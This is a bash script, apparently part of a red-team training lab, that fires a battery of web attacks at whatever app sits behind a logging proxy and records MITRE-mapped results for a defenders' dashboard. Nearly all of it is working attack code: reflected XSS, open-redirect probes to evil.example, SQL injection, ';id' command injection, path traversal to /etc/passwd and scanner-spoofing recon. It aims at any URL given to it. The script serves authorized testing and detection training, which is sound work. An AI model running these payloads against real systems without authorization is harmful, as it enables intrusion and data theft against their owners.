#!/usr/bin/env bash
#
# Generic web-attack playbook for a BRING-YOUR-OWN target.
# ------------------------------------------------------------------------------
# Unlike attack.sh (which exploits the lab's specific endpoints), this throws the
# standard web-attack classes at COMMON parameters of an arbitrary app, through the
# byo-proxy — so the blue team logs and detects every attempt regardless of the app,
# and a real vulnerability is confirmed when the app actually responds to it.
#
#   BASE_URL=http://byo-proxy:8080 ./attack-byo.sh     # attack whatever the proxy fronts
#
# Each technique is MITRE-mapped and recorded to <LOG_DIR>/redteam.jsonl for the
# dashboard. Only run this against an app you own or are authorized to test.
set -u

BASE_URL="${BASE_URL:-http://byo-proxy:8080}"
CURL=(curl --silent --show-error --max-time 12)
LOG_DIR="${LOG_DIR:-/logs}"; RT_JSON="${LOG_DIR}/redteam.jsonl"; : > "$RT_JSON" 2>/dev/null || RT_JSON=""
PASS=0; FAIL=0; TOTAL=0
CUR_NUM=""; CUR_TITLE=""; CUR_MITRE=""; CUR_MITRE_NAME=""

if [ -t 1 ]; then C_R=$'\033[0m'; C_B=$'\033[1m'; C_RED=$'\033[31m'; C_G=$'\033[32m'; C_Y=$'\033[33m'; C_C=$'\033[36m'; C_D=$'\033[2m'
else C_R=""; C_B=""; C_RED=""; C_G=""; C_Y=""; C_C=""; C_D=""; fi
je() { printf '%s' "$1" | sed 's/\\/\\\\/g; s/"/\\"/g' | tr -d '\n\r\t'; }
technique() { CUR_NUM="$1"; CUR_TITLE="$2"; CUR_MITRE="$3"; CUR_MITRE_NAME="$4"
  printf '\n%s── Technique %s: %s%s\n' "${C_B}${C_Y}" "$1" "$2" "$C_R"
  printf '%s   MITRE ATT&CK: %s (%s)%s\n' "$C_D" "$3" "$4" "$C_R"; }
ev() { printf '%s   evidence:%s\n' "$C_D" "$C_R"; sed 's/^/     | /'; }
verdict() { TOTAL=$((TOTAL+1))
  if [ "$1" = pass ]; then PASS=$((PASS+1)); printf '   %s[LANDED]%s %s\n' "${C_G}${C_B}" "$C_R" "$2"
  else FAIL=$((FAIL+1)); printf '   %s[probed]%s %s\n' "${C_Y}${C_B}" "$C_R" "$2"; fi
  [ -n "$RT_JSON" ] && printf '{"ts":"%s","num":%s,"title":"%s","mitre":"%s","mitre_name":"%s","verdict":"%s","message":"%s"}\n' \
    "$(date -u +%Y-%m-%dT%H:%M:%SZ 2>/dev/null)" "${CUR_NUM:-0}" "$(je "$CUR_TITLE")" "$(je "$CUR_MITRE")" \
    "$(je "$CUR_MITRE_NAME")" "$1" "$(je "$2")" >> "$RT_JSON" 2>/dev/null || true; }

printf '%s\n %sGeneric Web Attack — BYO target  (%s)%s\n%s\n' \
  "${C_B}${C_C}==============================================================================" \
  "" "$BASE_URL" "" "==============================================================================${C_R}"
for i in $(seq 1 15); do "${CURL[@]}" -o /dev/null "${BASE_URL}/" 2>/dev/null && break; sleep 0.5; done

# common parameter names to spray each payload class across
XSS_PARAMS="q search s query term name"
REDIR_PARAMS="url next redirect return returnTo dest to continue"
SQLI_PARAMS="id user account q search"
TRAV_PARAMS="file path page template download doc"
CMD_PARAMS="host ip cmd ping target domain"
PATHS="/ /search /api/search /login /go /redirect /download /ping"

# 1. RECON
technique 1 "Reconnaissance — banner + scanner sweep" "T1595.002" "Active Scanning: Vulnerability Scanning"
banner="$("${CURL[@]}" -A "njordscan-redteam/1.0 (nmap-style)" -I "${BASE_URL}/" 2>/dev/null)"
printf '%s\n' "$banner" | grep -iE '^server|^x-powered-by' | tr -d '\r' | ev
"${CURL[@]}" -A "sqlmap/1.7" -o /dev/null "${BASE_URL}/?probe=1" 2>/dev/null
verdict pass "sent scanner-style requests (UA + banner grab) — recon traffic the SOC should notice"

# 2. REFLECTED XSS
technique 2 "Reflected XSS" "T1059.007" "Command and Scripting Interpreter: JavaScript"
XSS='<script>alert(document.domain)</script>'; hit=0
for p in $PATHS; do for q in $XSS_PARAMS; do
  r="$("${CURL[@]}" -G "${BASE_URL}${p}" --data-urlencode "${q}=${XSS}" 2>/dev/null)"
  printf '%s' "$r" | grep -qF "$XSS" && { printf '%s%s?%s= reflected the raw <script>\n' "$BASE_URL" "$p" "$q" | ev; hit=1; break 2; }
done; done
[ "$hit" = 1 ] && verdict pass "raw <script> reflected unescaped — confirmed reflected XSS" \
                || verdict fail "XSS payloads sent to common params (no reflection confirmed on this app)"

# 3. OPEN REDIRECT
technique 3 "Open Redirect" "T1566.002" "Phishing: Spearphishing Link"
EVIL='https://evil.example/x'; hit=0
for p in $PATHS; do for q in $REDIR_PARAMS; do
  loc="$("${CURL[@]}" -D - -o /dev/null -G "${BASE_URL}${p}" --data-urlencode "${q}=${EVIL}" 2>/dev/null | grep -i '^location:' | tr -d '\r')"
  printf '%s' "$loc" | grep -qF "$EVIL" && { printf '%s%s?%s= -> %s\n' "$BASE_URL" "$p" "$q" "$loc" | ev; hit=1; break 2; }
done; done
[ "$hit" = 1 ] && verdict pass "off-site Location returned for attacker URL — confirmed open redirect" \
                || verdict fail "redirect params probed (no off-site redirect confirmed)"

# 4. SQL INJECTION
technique 4 "SQL Injection" "T1190" "Exploit Public-Facing Application"
hit=0
for p in $PATHS; do for q in $SQLI_PARAMS; do
  r="$("${CURL[@]}" -G "${BASE_URL}${p}" --data-urlencode "${q}=' OR '1'='1" 2>/dev/null)"
  printf '%s' "$r" | grep -qiE 'sql syntax|sqlite|psql|mysql|ORA-[0-9]|unclosed quotation|sqlstate' && {
    printf '%s%s?%s SQL error leaked\n' "$BASE_URL" "$p" "$q" | ev; hit=1; break 2; }
done; done
[ "$hit" = 1 ] && verdict pass "SQL error provoked by an injected quote — likely SQL injection" \
                || verdict fail "SQLi payloads sent to common params (no SQL error surfaced)"

# 5. OS COMMAND INJECTION
technique 5 "OS Command Injection" "T1059.004" "Command and Scripting Interpreter: Unix Shell"
hit=0
for p in $PATHS; do for q in $CMD_PARAMS; do
  r="$("${CURL[@]}" -G "${BASE_URL}${p}" --data-urlencode "${q}=127.0.0.1;id" 2>/dev/null)"
  printf '%s' "$r" | grep -qE 'uid=[0-9]+\(' && { printf '%s%s?%s -> id output\n' "$BASE_URL" "$p" "$q" | ev; hit=1; break 2; }
done; done
[ "$hit" = 1 ] && verdict pass "injected ;id executed — confirmed command injection (RCE)" \
                || verdict fail "command-injection payloads sent (no command output confirmed)"

# 6. PATH TRAVERSAL
technique 6 "Path Traversal" "T1083" "File and Directory Discovery"
hit=0
for p in $PATHS; do for q in $TRAV_PARAMS; do
  r="$("${CURL[@]}" -G "${BASE_URL}${p}" --data-urlencode "${q}=../../../../etc/passwd" 2>/dev/null)"
  printf '%s' "$r" | grep -qE 'root:.*:0:0:' && { printf '%s%s?%s -> /etc/passwd\n' "$BASE_URL" "$p" "$q" | ev; hit=1; break 2; }
done; done
[ "$hit" = 1 ] && verdict pass "/etc/passwd contents returned — confirmed path traversal" \
                || verdict fail "traversal payloads sent (no file contents leaked)"

# 7. VERBOSE ERROR / INFO LEAK
technique 7 "Verbose Errors / Information Disclosure" "T1592.002" "Gather Victim Host Information: Software"
err="$("${CURL[@]}" "${BASE_URL}/this-route-should-not-exist-$$" 2>/dev/null)$("${CURL[@]}" -G "${BASE_URL}/" --data-urlencode 'x=%00' 2>/dev/null)"
if printf '%s' "$err" | grep -qiE 'at .*\.js:[0-9]|traceback|stack|Exception|Error:.*at '; then
  printf '%s' "$err" | grep -iE 'error|at .*:[0-9]' | head -3 | ev
  verdict pass "a bad request returned a stack trace / internal error to an anonymous caller"
else verdict fail "error-triggering requests sent (no verbose stack trace observed)"; fi

# 8. INSECURE SESSION COOKIE
technique 8 "Insecure Session Cookie" "T1539" "Steal Web Session Cookie"
ck="$("${CURL[@]}" -D - -o /dev/null "${BASE_URL}/login" 2>/dev/null; "${CURL[@]}" -D - -o /dev/null "${BASE_URL}/" 2>/dev/null)"
sc="$(printf '%s' "$ck" | grep -i '^set-cookie:' | head -1 | tr -d '\r')"
if [ -n "$sc" ] && ! printf '%s' "$sc" | grep -qi 'httponly'; then
  printf '%s\n' "$sc" | ev; verdict pass "session cookie set without HttpOnly/Secure/SameSite — stealable"
else verdict fail "no insecure session cookie observed"; fi

# 9. MISSING SECURITY HEADERS
technique 9 "Missing Security Headers" "T1190" "Exploit Public-Facing Application"
h="$("${CURL[@]}" -D - -o /dev/null "${BASE_URL}/" 2>/dev/null)"
miss=""
printf '%s' "$h" | grep -qi 'content-security-policy' || miss="$miss CSP"
printf '%s' "$h" | grep -qi 'strict-transport-security' || miss="$miss HSTS"
printf '%s' "$h" | grep -qi 'x-frame-options' || miss="$miss X-Frame-Options"
if [ -n "$miss" ]; then printf 'missing:%s\n' "$miss" | ev; verdict pass "response is missing security headers:$miss"
else verdict fail "core security headers present"; fi

printf '\n%s %s/%s techniques confirmed landed%s · %s probed (blue team logged every attempt)\n' \
  "${C_B}${C_C}" "$PASS" "$TOTAL" "$C_R" "$FAIL"
exit 0
